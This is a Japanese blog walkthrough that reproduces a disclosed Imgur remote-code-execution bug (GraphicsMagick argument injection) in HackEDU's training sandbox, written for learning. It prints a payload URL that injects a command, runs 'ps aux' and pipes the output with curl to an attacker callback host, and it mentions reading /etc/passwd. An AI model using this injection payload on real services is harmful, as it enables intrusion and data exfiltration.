
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-136221103-1"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'UA-136221103-1');
        </script>

        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>HackerOneに報告された脆弱性をHackEDUで再現する · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">

        <meta name="twitter:card" content="summary" />
        <meta name="twitter:title" content="HackerOneに報告された脆弱性をHackEDUで再現する" />
        <meta name="twitter:image" content="https://akaki.io/gitbook/images/apple-touch-icon-precomposed-152.png" />

        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
        <link rel="stylesheet" href="../book.css">
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../2018/impact_of_cookie_bomb.html" />
    
    
    <link rel="prev" href="../" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Akaki I/O
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">2019</li>
        
        
    
        <li class="chapter active" data-level="2.1" data-path="hackedu.html">
            
                <a href="hackedu.html">
            
                    
                    HackerOneに報告された脆弱性をHackEDUで再現する
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">2018</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../2018/impact_of_cookie_bomb.html">
            
                <a href="../2018/impact_of_cookie_bomb.html">
            
                    
                    CRLFインジェクションによるCookie Bombの脅威
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2" data-path="../2018/analyzing_samy_xss_worm.html">
            
                <a href="../2018/analyzing_samy_xss_worm.html">
            
                    
                    XSSワーム「Samy」の動作を解析する
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.3" data-path="../2018/crlfi_via_path_of_request-uri.html">
            
                <a href="../2018/crlfi_via_path_of_request-uri.html">
            
                    
                    Request-URIのパスからのCRLFインジェクション
            
                </a>
            

            
        </li>
    

    
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >HackerOneに報告された脆弱性をHackEDUで再現する</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="hackerone&#x306B;&#x5831;&#x544A;&#x3055;&#x308C;&#x305F;&#x8106;&#x5F31;&#x6027;&#x3092;hackedu&#x3067;&#x518D;&#x73FE;&#x3059;&#x308B;">HackerOne&#x306B;&#x5831;&#x544A;&#x3055;&#x308C;&#x305F;&#x8106;&#x5F31;&#x6027;&#x3092;HackEDU&#x3067;&#x518D;&#x73FE;&#x3059;&#x308B;</h1>
<p>&#x30B5;&#x30A4;&#x30D0;&#x30FC;&#x30BB;&#x30AD;&#x30E5;&#x30EA;&#x30C6;&#x30A3;&#x306B;&#x95A2;&#x3059;&#x308B;&#x4F53;&#x9A13;&#x578B;&#x5B66;&#x7FD2;&#x30B5;&#x30FC;&#x30D3;&#x30B9;&#x3092;&#x63D0;&#x4F9B;&#x3059;&#x308B;&#x300C;<a href="https://hackedu.io/" target="_blank">HackEDU</a>&#x300D;&#x304C;<a href="https://www.hackerone.com/blog/Test-your-hacking-skills-real-world-simulated-bugs" target="_blank">HackerOne&#x3068;&#x63D0;&#x643A;&#x3057;&#x3001;&#x904E;&#x53BB;&#x306B;&#x5831;&#x544A;&#x3055;&#x308C;&#x305F;&#x8106;&#x5F31;&#x6027;&#x3092;&#x518D;&#x73FE;&#x3067;&#x304D;&#x308B;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3092;&#x30EA;&#x30EA;&#x30FC;&#x30B9;&#x3057;&#x305F;</a>&#x3002;
HackEDU&#x306E;&#x7121;&#x6599;&#x30A2;&#x30AB;&#x30A6;&#x30F3;&#x30C8;&#x3092;&#x4F5C;&#x6210;&#x3059;&#x308B;&#x3060;&#x3051;&#x3067;&#x3001;HackerOne&#x306B;&#x5831;&#x544A;&#x3055;&#x308C;&#x305F;5&#x3064;&#x306E;&#x8106;&#x5F31;&#x6027;&#x306E;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3092;&#x5229;&#x7528;&#x3067;&#x304D;&#x308B;&#x3002;</p>
<p>&#x4ECA;&#x56DE;&#x306F;&#x30D0;&#x30B0;&#x30CF;&#x30F3;&#x30BF;&#x30FC;&#x306E;neex&#x6C0F;&#x304C;2017&#x5E74;&#x306B;&#x5831;&#x544A;&#x3057;&#x305F;Imgur&#x3068;&#x3044;&#x3046;&#x753B;&#x50CF;&#x5171;&#x6709;&#x30B5;&#x30A4;&#x30C8;&#x3067;&#x306E;RCE&#xFF08;<a href="https://hackerone.com/reports/212696" target="_blank">#212696</a>&#xFF09;&#x3092;&#x53D6;&#x308A;&#x4E0A;&#x3052;&#x308B;&#x3002;neex&#x6C0F;&#x304C;&#x8106;&#x5F31;&#x6027;&#x3092;&#x767A;&#x898B;&#x3057;&#x305F;&#x969B;&#x306E;&#x624B;&#x9806;&#x3092;&#x518D;&#x73FE;&#x3057;&#x306A;&#x304C;&#x3089;&#x8A73;&#x7D30;&#x3092;&#x5B66;&#x3093;&#x3067;&#x3044;&#x304F;&#x3002;</p>
<h2 id="imgur&#x3067;&#x306E;rce&#x306E;&#x518D;&#x73FE;">Imgur&#x3067;&#x306E;RCE&#x306E;&#x518D;&#x73FE;</h2>
<p>HackEDU&#x306E;&#x5229;&#x7528;&#x8005;&#x306F;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x304B;&#x3089;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x306B;&#x30A2;&#x30AF;&#x30BB;&#x30B9;&#x3057;&#x3001;&#x30DA;&#x30FC;&#x30B8;&#x5185;&#x306B;&#x7528;&#x610F;&#x3055;&#x308C;&#x305F;&#x4EEE;&#x60F3;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x3068;&#x4EEE;&#x60F3;&#x30D7;&#x30ED;&#x30AD;&#x30B7;&#x3092;&#x4F7F;&#x3063;&#x3066;&#x8106;&#x5F31;&#x6027;&#x3092;&#x518D;&#x73FE;&#x3059;&#x308B;&#x3002;&#x4EE5;&#x4E0B;&#x306E;&#x30DA;&#x30FC;&#x30B8;&#x304C;<a href="https://hackedu.io/hacktivity/5f8e247b-98bc-4b7a-aa97-472dcc34a6f8" target="_blank">Imgur&#x3067;&#x306E;RCE&#x306E;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;</a>&#x3067;&#x3042;&#x308B;&#x3002;&#x4EEE;&#x60F3;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x4E0A;&#x306E;1&#x3064;&#x76EE;&#x306E;&#x30BF;&#x30D6;&#x306B;Imgur&#x3092;&#x518D;&#x73FE;&#x3057;&#x305F;Imger&#x3068;&#x3044;&#x3046;&#x30B5;&#x30A4;&#x30C8;&#x304C;&#x3001;2&#x3064;&#x76EE;&#x306B;&#x30B3;&#x30FC;&#x30EB;&#x30D0;&#x30C3;&#x30AF;&#x3092;&#x78BA;&#x8A8D;&#x3059;&#x308B;&#x305F;&#x3081;&#x306E;&#x30BF;&#x30D6;&#x304C;&#x958B;&#x304B;&#x308C;&#x3066;&#x3044;&#x308B;&#x3002;</p>
<p><img src="https://user-images.githubusercontent.com/5434303/53991342-baa30f80-416d-11e9-8882-70e33c8bccb8.png" alt="top"></p>
<p>neex&#x6C0F;&#x306E;&#x30EC;&#x30DD;&#x30FC;&#x30C8;&#x306B;&#x3088;&#x308B;&#x3068;&#x8106;&#x5F31;&#x6027;&#x306F;&#x753B;&#x50CF;&#x7DE8;&#x96C6;&#x6A5F;&#x80FD;&#x3067;&#x898B;&#x3064;&#x304B;&#x3063;&#x3066;&#x3044;&#x308B;&#x3002;Imgur&#x3067;&#x306F;&#x753B;&#x50CF;&#x51E6;&#x7406;&#x30C4;&#x30FC;&#x30EB;&#x3068;&#x3057;&#x3066;&#x4EBA;&#x6C17;&#x306E;&#x9AD8;&#x3044;ImageMagick&#x3068;GraphicsMagick&#x306E;&#x3069;&#x3061;&#x3089;&#x304B;&#x304C;&#x5229;&#x7528;&#x3055;&#x308C;&#x3066;&#x3044;&#x308B;&#x3068;neex&#x6C0F;&#x306F;&#x63A8;&#x6E2C;&#x3057;&#x3001;&#x3069;&#x3061;&#x3089;&#x306E;&#x30C4;&#x30FC;&#x30EB;&#x306B;&#x3082;&#x5B58;&#x5728;&#x3059;&#x308B; <code>-rotate</code> &#x30AA;&#x30D7;&#x30B7;&#x30E7;&#x30F3;&#x3092;&#x7528;&#x3044;&#x3066;&#x8ABF;&#x67FB;&#x3092;&#x59CB;&#x3081;&#x3066;&#x3044;&#x308B;&#x3002;</p>
<p>&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3067;&#x306F;&#x753B;&#x50CF;&#x7DE8;&#x96C6;&#x6642;&#x306E;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x304C;POST&#x30E1;&#x30BD;&#x30C3;&#x30C9;&#x3067;&#x9001;&#x3089;&#x308C;&#x308B;&#x304C;&#x3001;GET&#x30E1;&#x30BD;&#x30C3;&#x30C9;&#x306B;&#x5909;&#x66F4;&#x3057;&#x3066;&#x3082;&#x554F;&#x984C;&#x306A;&#x304F;&#x51E6;&#x7406;&#x3055;&#x308C;&#x308B;&#x3002;&#x4ECA;&#x56DE;&#x306F;&#x30EC;&#x30DD;&#x30FC;&#x30C8;&#x3092;&#x5FE0;&#x5B9F;&#x306B;&#x518D;&#x73FE;&#x3059;&#x308B;&#x305F;&#x3081;&#x3001;&#x4EEE;&#x60F3;&#x30D7;&#x30ED;&#x30AD;&#x30B7;&#x3067;&#x30A4;&#x30F3;&#x30BF;&#x30FC;&#x30BB;&#x30D7;&#x30C8;&#x3057;&#x305F;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x3092;GET&#x30E1;&#x30BD;&#x30C3;&#x30C9;&#x306B;&#x5909;&#x66F4;&#x3057;&#x305F;&#x4E0A;&#x3067;&#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x306E;&#x5024;&#x3092;&#x66F8;&#x304D;&#x63DB;&#x3048;&#x308B;&#x3002;</p>
<p><img src="https://user-images.githubusercontent.com/5434303/53991381-cdb5df80-416d-11e9-8666-90a50c8471fc.png" alt="intercept"></p>
<p>Imgur&#x3067;&#x306F;&#x753B;&#x50CF;&#x7DE8;&#x96C6;&#x6642;&#x306B;&#x9001;&#x4FE1;&#x3055;&#x308C;&#x308B; <code>y</code> &#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x306E;&#x5024;&#x3092;&#x753B;&#x50CF;&#x51E6;&#x7406;&#x30C4;&#x30FC;&#x30EB;&#x306E;&#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x30E9;&#x30A4;&#x30F3;&#x5F15;&#x6570;&#x306B;&#x633F;&#x5165;&#x3057;&#x3066;&#x3044;&#x305F;&#x305F;&#x3081;&#x8106;&#x5F31;&#x6027;&#x304C;&#x751F;&#x3058;&#x305F;&#x3002;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3067;&#x3082; <code>y</code> &#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x306E;&#x5024;&#x306B; <code>-rotate 90</code> &#x3092;&#x8FFD;&#x52A0;&#x3059;&#x308B;&#x3068;&#x753B;&#x50CF;&#x304C;90&#x5EA6;&#x56DE;&#x8EE2;&#x3059;&#x308B;&#x3002;</p>
<p><img src="https://user-images.githubusercontent.com/5434303/53991406-de665580-416d-11e9-9901-3921ed52caa3.png" alt="rotate"></p>
<p>&#x3055;&#x3089;&#x306A;&#x308B;&#x8ABF;&#x67FB;&#x306E;&#x7D50;&#x679C;&#x3001;Imgur&#x3067;&#x306F;GraphicsMagick&#x304C;&#x5229;&#x7528;&#x3055;&#x308C;&#x3066;&#x3044;&#x308B;&#x3068;neex&#x6C0F;&#x306F;&#x78BA;&#x4FE1;&#x3057;&#x3001;<code>-write</code> &#x30AA;&#x30D7;&#x30B7;&#x30E7;&#x30F3;&#x3067;&#x4EFB;&#x610F;&#x306E;&#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x3092;&#x5B9F;&#x884C;&#x3067;&#x304D;&#x308B;&#x4ED5;&#x69D8;&#x3092;&#x7528;&#x3044;&#x3066;RCE&#x3092;&#x5B9F;&#x8A3C;&#x3057;&#x305F;<sup id="f1"><a href="#fn1">1</a></sup>&#x3002;PoC&#x3067;&#x306F; <code>y</code> &#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x304B;&#x3089;&#x633F;&#x5165;&#x3057;&#x305F; <code>ps</code> &#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x306E;&#x5B9F;&#x884C;&#x7D50;&#x679C;&#x3092; <code>curl</code> &#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x3067;&#x5916;&#x90E8;&#x306E;&#x30B5;&#x30FC;&#x30D0;&#x30FC;&#x3078;&#x9001;&#x4FE1;&#x3057;&#x3066;&#x3044;&#x308B;&#x3002;</p>
<p>&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3067;&#x306F; <code>http://attacker-callback.com:9000</code> &#x3078;&#x306E;&#x30B3;&#x30FC;&#x30EB;&#x30D0;&#x30C3;&#x30AF;&#x3092;&#x4EEE;&#x60F3;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x306E;2&#x3064;&#x76EE;&#x306E;&#x30BF;&#x30D6;&#x3067;&#x78BA;&#x8A8D;&#x3067;&#x304D;&#x308B;&#x3002;2&#x3064;&#x76EE;&#x306E;&#x30BF;&#x30D6;&#x3092;&#x4E8B;&#x524D;&#x306B;&#x958B;&#x3044;&#x3066;&#x30EA;&#x30C3;&#x30B9;&#x30F3;&#x72B6;&#x614B;&#x306B;&#x3057;&#x3066;&#x304B;&#x3089;&#x3001;1&#x3064;&#x76EE;&#x306E;&#x30BF;&#x30D6;&#x3067;&#x4EE5;&#x4E0B;&#x306E;URL&#x306B;&#x30A2;&#x30AF;&#x30BB;&#x30B9;&#x3059;&#x308B;&#x3068; <code>ps</code> &#x30B3;&#x30DE;&#x30F3;&#x30C9;&#x306E;&#x5B9F;&#x884C;&#x7D50;&#x679C;&#x3092;&#x53D7;&#x3051;&#x53D6;&#x308C;&#x308B;&#x3002;&#x5B9F;&#x969B;&#x306E;&#x74B0;&#x5883;&#x3067;&#x306F;&#x30B9;&#x30DA;&#x30FC;&#x30B9;&#xFF08;%20&#xFF09;&#x3092;&#x633F;&#x5165;&#x3067;&#x304D;&#x306A;&#x304B;&#x3063;&#x305F;&#x305F;&#x3081;&#x304B;&#x3001;neex&#x6C0F;&#x306F; <code>${IFS}</code> &#x3092;&#x4EE3;&#x7528;&#x3057;&#x3066;&#x6587;&#x5B57;&#x3092;&#x533A;&#x5207;&#x3063;&#x3066;&#x3044;&#x308B;<sup id="f2"><a href="#fn2">2</a></sup>&#x3002;</p>
<p>http:<span>//imger.com/edit/process?imageid=cd4caa87977d1469cfeedf5cce8e2992.jpg&amp;a=crop&amp;x=95&amp;y=41%20-write%20|ps${IFS}aux|curl${IFS}http:<span>//attacker-callback.com:9000${IFS}-d${IFS}@-&amp;w=768&amp;h=328&amp;random=asdf</span></span></p>
<p><img src="https://user-images.githubusercontent.com/5434303/53991423-ec1bdb00-416d-11e9-8345-4de5bbc8f3b2.png" alt="callback"></p>
<h2 id="hackedu&#x3067;&#x306E;http&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x306E;&#x518D;&#x9001;">HackEDU&#x3067;&#x306E;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x306E;&#x518D;&#x9001;</h2>
<p>&#x4ECA;&#x56DE;&#x53D6;&#x308A;&#x4E0A;&#x3052;&#x305F;&#x8106;&#x5F31;&#x6027;&#x306F;GET&#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x3067;&#x3082;&#x518D;&#x73FE;&#x3067;&#x304D;&#x305F;&#x305F;&#x3081;&#x3001;&#x4EEE;&#x60F3;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x306E;&#x30A2;&#x30C9;&#x30EC;&#x30B9;&#x30D0;&#x30FC;&#x304B;&#x3089;&#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x64CD;&#x4F5C;&#x304C;&#x53EF;&#x80FD;&#x3067;&#x3042;&#x3063;&#x305F;&#x3002;&#x3057;&#x304B;&#x3057;POST&#x30D1;&#x30E9;&#x30E1;&#x30FC;&#x30BF;&#x3067;&#x306E;&#x8106;&#x5F31;&#x6027;&#x3092;&#x691C;&#x8A3C;&#x3059;&#x308B;&#x5834;&#x5408;&#x3001;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x3092;&#x4F55;&#x5EA6;&#x3082;&#x30A4;&#x30F3;&#x30BF;&#x30FC;&#x30BB;&#x30D7;&#x30C8;&#x3057;&#x3066;&#x66F8;&#x304D;&#x63DB;&#x3048;&#x308B;&#x3053;&#x3068;&#x306B;&#x306A;&#x308B;&#x3002;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x306E;&#x4EEE;&#x60F3;&#x30D7;&#x30ED;&#x30AD;&#x30B7;&#x306B;&#x306F;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x306E;&#x518D;&#x9001;&#x6A5F;&#x80FD;&#x304C;&#x642D;&#x8F09;&#x3055;&#x308C;&#x3066;&#x3044;&#x306A;&#x3044;&#x305F;&#x3081;&#x3001;&#x611B;&#x7528;&#x306E;&#x30ED;&#x30FC;&#x30AB;&#x30EB;&#x30D7;&#x30ED;&#x30AD;&#x30B7;&#x3067;&#x306E;&#x518D;&#x9001;&#x3092;&#x8A66;&#x307F;&#x308B;&#x3002;</p>
<p>&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3068;&#x306F;&#x3044;&#x3048;&#x4EEE;&#x60F3;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x304B;&#x3089;&#x767A;&#x751F;&#x3059;&#x308B;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x306F;HackEDU&#x306E;&#x30B5;&#x30FC;&#x30D0;&#x30FC;&#x306B;&#x9001;&#x4FE1;&#x3055;&#x308C;&#x308B;&#x3002;&#x305D;&#x306E;&#x305F;&#x3081;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x306E;&#x30DA;&#x30FC;&#x30B8;&#x3092;&#x958B;&#x3044;&#x3066;&#x3044;&#x308B;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x3067;&#x30ED;&#x30FC;&#x30AB;&#x30EB;&#x30D7;&#x30ED;&#x30AD;&#x30B7;&#x3092;&#x7D4C;&#x7531;&#x3059;&#x308C;&#x3070;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x3092;&#x64CD;&#x4F5C;&#x3067;&#x304D;&#x308B;&#x3002;&#x4F8B;&#x3048;&#x3070;Burp Suite&#x306E;Repeater&#x3067;&#x4EE5;&#x4E0B;&#x306E;HTTP&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x3092;&#x518D;&#x9001;&#x3059;&#x308B;&#x3068;&#x3001;&#x4EEE;&#x60F3;&#x30D6;&#x30E9;&#x30A6;&#x30B6;&#x306E;2&#x3064;&#x76EE;&#x306E;&#x30BF;&#x30D6;&#x306B; <code>/etc/passwd</code> &#x306E;&#x5185;&#x5BB9;&#x304C;&#x8868;&#x793A;&#x3055;&#x308C;&#x308B;&#x3002;</p>
<p><img src="https://user-images.githubusercontent.com/5434303/53991456-fb9b2400-416d-11e9-9a44-c8165269a667.png" alt="burp"></p>
<h2 id="&#x6240;&#x611F;">&#x6240;&#x611F;</h2>
<p>&#x8106;&#x5F31;&#x6027;&#x306E;&#x30EC;&#x30DD;&#x30FC;&#x30C8;&#x3092;&#x8AAD;&#x3080;&#x3060;&#x3051;&#x3068;&#x3001;&#x5B9F;&#x969B;&#x306B;&#x518D;&#x73FE;&#x307E;&#x3067;&#x78BA;&#x8A8D;&#x3059;&#x308B;&#x3068;&#x3067;&#x306F;&#x5B66;&#x3073;&#x306E;&#x91CF;&#x304C;&#x9055;&#x3046;&#x3002;&#x30EC;&#x30DD;&#x30FC;&#x30C8;&#x306B;&#x8A18;&#x8F09;&#x3055;&#x308C;&#x3066;&#x3044;&#x306A;&#x3044;&#x5225;&#x306E;&#x30D1;&#x30BF;&#x30FC;&#x30F3;&#x3092;&#x8A66;&#x3059;&#x3053;&#x3068;&#x3067;&#x65B0;&#x305F;&#x306A;&#x767A;&#x898B;&#x306B;&#x3082;&#x3064;&#x306A;&#x304C;&#x308B;&#x3057;&#x3001;&#x8A18;&#x61B6;&#x306B;&#x3082;&#x6B8B;&#x308A;&#x3084;&#x3059;&#x3044;&#x3002;&#x30BD;&#x30D5;&#x30C8;&#x30A6;&#x30A7;&#x30A2;&#x88FD;&#x54C1;&#x306E;&#x8106;&#x5F31;&#x6027;&#x306E;&#x5834;&#x5408;&#x3001;&#x4FEE;&#x6B63;&#x524D;&#x306E;&#x53E4;&#x3044;&#x30D0;&#x30FC;&#x30B8;&#x30E7;&#x30F3;&#x3092;&#x5165;&#x624B;&#x3067;&#x304D;&#x308C;&#x3070;&#x518D;&#x73FE;&#x306F;&#x53EF;&#x80FD;&#x3067;&#x3042;&#x308B;&#x3002;&#x3057;&#x304B;&#x3057;Web&#x30A2;&#x30D7;&#x30EA;&#x30B1;&#x30FC;&#x30B7;&#x30E7;&#x30F3;&#x306E;&#x8106;&#x5F31;&#x6027;&#x306E;&#x5834;&#x5408;&#x3001;&#x30B5;&#x30A4;&#x30C8;&#x904B;&#x55B6;&#x8005;&#x3067;&#x306A;&#x3051;&#x308C;&#x3070;&#x4FEE;&#x6B63;&#x5F8C;&#x306E;&#x518D;&#x73FE;&#x306F;&#x6975;&#x3081;&#x3066;&#x96E3;&#x3057;&#x3044;&#x3002;HackEDU&#x306E;&#x3088;&#x3046;&#x306A;&#x30B5;&#x30FC;&#x30D3;&#x30B9;&#x306B;&#x3088;&#x308A;&#x5B9F;&#x5728;&#x3057;&#x305F;&#x8106;&#x5F31;&#x6027;&#x3092;&#x5BB9;&#x6613;&#x306B;&#x518D;&#x73FE;&#x3067;&#x304D;&#x308B;&#x3088;&#x3046;&#x306B;&#x306A;&#x308C;&#x3070;&#x3001;&#x30D0;&#x30B0;&#x30CF;&#x30F3;&#x30BF;&#x30FC;&#x3060;&#x3051;&#x3067;&#x306A;&#x304F;&#x958B;&#x767A;&#x8005;&#x306E;&#x5B66;&#x3073;&#x306B;&#x3082;&#x5F79;&#x7ACB;&#x3064;&#x3060;&#x308D;&#x3046;&#x3002;</p>
<p>&#x4ECA;&#x56DE;&#x306F;&#x53D6;&#x308A;&#x4E0A;&#x3052;&#x306A;&#x304B;&#x3063;&#x305F;&#x304C;&#x3001;HackEDU&#x306F;Web&#x30A2;&#x30D7;&#x30EA;&#x30B1;&#x30FC;&#x30B7;&#x30E7;&#x30F3;&#x306E;&#x5404;&#x7A2E;&#x8106;&#x5F31;&#x6027;&#x306E;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3084;CTF&#x5F62;&#x5F0F;&#x306E;&#x554F;&#x984C;&#x3082;&#x63D0;&#x4F9B;&#x3057;&#x3066;&#x3044;&#x308B;&#x3002;<a href="https://hackedu.io/demo" target="_blank">&#x7121;&#x6599;&#x30A2;&#x30AB;&#x30A6;&#x30F3;&#x30C8;&#x3067;&#x306F;SQL&#x30A4;&#x30F3;&#x30B8;&#x30A7;&#x30AF;&#x30B7;&#x30E7;&#x30F3;&#x306E;&#x307F;</a>&#x3060;&#x304C;&#x3001;&#x8106;&#x5F31;&#x6027;&#x306E;&#x518D;&#x73FE;&#x304B;&#x3089;&#x5404;&#x30D7;&#x30ED;&#x30B0;&#x30E9;&#x30DF;&#x30F3;&#x30B0;&#x8A00;&#x8A9E;&#x3067;&#x306E;&#x4FEE;&#x6B63;&#x307E;&#x3067;&#x4F53;&#x9A13;&#x3067;&#x304D;&#x308B;&#x30B3;&#x30FC;&#x30B9;&#x3082;&#x3042;&#x308B;&#x3002;&#x307E;&#x305F;&#x5E74;&#x9593;$750&#x306E;&#x6709;&#x6599;&#x30A2;&#x30AB;&#x30A6;&#x30F3;&#x30C8;&#x306B;&#x306A;&#x308C;&#x3070;<a href="https://hackedu.io/vulnerabilities" target="_blank">CVE&#x304C;&#x5272;&#x308A;&#x632F;&#x3089;&#x308C;&#x305F;&#x30BD;&#x30D5;&#x30C8;&#x30A6;&#x30A7;&#x30A2;&#x88FD;&#x54C1;&#x306E;&#x8106;&#x5F31;&#x6027;</a>&#x3084;&#x3001;&#x30D0;&#x30C3;&#x30D5;&#x30A1;&#x30AA;&#x30FC;&#x30D0;&#x30FC;&#x30D5;&#x30ED;&#x30FC;&#x306E;&#x3088;&#x3046;&#x306A;&#x8106;&#x5F31;&#x6027;&#x306E;&#x30B5;&#x30F3;&#x30C9;&#x30DC;&#x30C3;&#x30AF;&#x30B9;&#x74B0;&#x5883;&#x3082;&#x5229;&#x7528;&#x3067;&#x304D;&#x308B;&#x3088;&#x3046;&#x306B;&#x306A;&#x308B;&#x3002;&#x6709;&#x6599;&#x30A2;&#x30AB;&#x30A6;&#x30F3;&#x30C8;&#x306F;7&#x65E5;&#x9593;&#x306E;&#x7121;&#x6599;&#x4F53;&#x9A13;&#x304C;&#x3067;&#x304D;&#x308B;&#x306E;&#x3067;&#x3001;&#x307E;&#x305A;&#x306F;&#x8A66;&#x7528;&#x3057;&#x3066;&#x304B;&#x3089;&#x8CFC;&#x5165;&#x3092;&#x691C;&#x8A0E;&#x3057;&#x305F;&#x3044;&#x3002;</p>
<hr>
<p><sup id="fn1"><a href="#f1">1</a></sup> <a href="http://www.graphicsmagick.org/GraphicsMagick.html#details-write" target="_blank">http://www.graphicsmagick.org/GraphicsMagick.html#details-write</a><br><sup id="fn2"><a href="#f2">2</a></sup> <a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution" target="_blank">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/os-cmd-execution</a>  </p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../" class="navigation navigation-prev " aria-label="Previous page: Akaki I/O">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../2018/impact_of_cookie_bomb.html" class="navigation navigation-next " aria-label="Next page: CRLFインジェクションによるCookie Bombの脅威">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
